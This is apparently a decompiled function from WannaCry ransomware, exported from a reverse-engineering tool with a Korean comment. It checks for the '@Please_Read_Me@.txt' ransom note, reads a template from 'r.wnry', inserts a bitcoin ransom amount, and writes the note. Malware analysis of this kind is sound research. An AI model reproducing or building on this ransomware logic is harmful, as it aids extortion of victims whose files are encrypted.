// --- Metadata ---
// Function Name: createReadMe_10004DF0
// Address: 0x10004DF0
// Exported At: 20250522_120622
// Signature: unknown_signature
// ---------------
FILE *createReadMe_10004DF0()
{
  FILE *result; // eax
  FILE *v1; // esi
  FILE *v2; // esi
  char v3[100]; // [esp+14h] [ebp-23ECh] BYREF
  char Buffer; // [esp+78h] [ebp-2388h] BYREF
  char v5[4092]; // [esp+79h] [ebp-2387h] BYREF
  __int16 v6; // [esp+1075h] [ebp-138Bh]
  char v7; // [esp+1077h] [ebp-1389h]
  char v8[5000]; // [esp+1078h] [ebp-1388h] BYREF

  result = (FILE *)GetFileAttributesW(L"@Please_Read_Me@.txt");// @Please_Read_Me@.txt를 생성 
  if ( result == (FILE *)-1 )
  {
    result = fopen("r.wnry", "rb");
    v1 = result;
    if ( result )
    {
      Buffer = 0;
      memset(v5, 0, sizeof(v5));
      v6 = 0;
      v7 = 0;
      fread(&Buffer, 1u, 0x1000u, result);
      fclose(v1);
      result = wfopen(L"@Please_Read_Me@.txt", L"wb");
      v2 = result;
      if ( result )
      {
        if ( dword_1000D9D4 )
          sprintf(v3, "%.1f BTC", flt_1000D9D0);
        else
          sprintf(v3, "$%d worth of bitcoin", (unsigned int)(__int64)flt_1000D9D0);
        sprintf(v8, &Buffer, v3, &unk_1000DA0A, "@WanaDecryptor@.exe");
        fwrite(v8, 1u, strlen(v8) + 1, v2);
        result = (FILE *)fclose(v2);
      }
    }
  }
  return result;
}
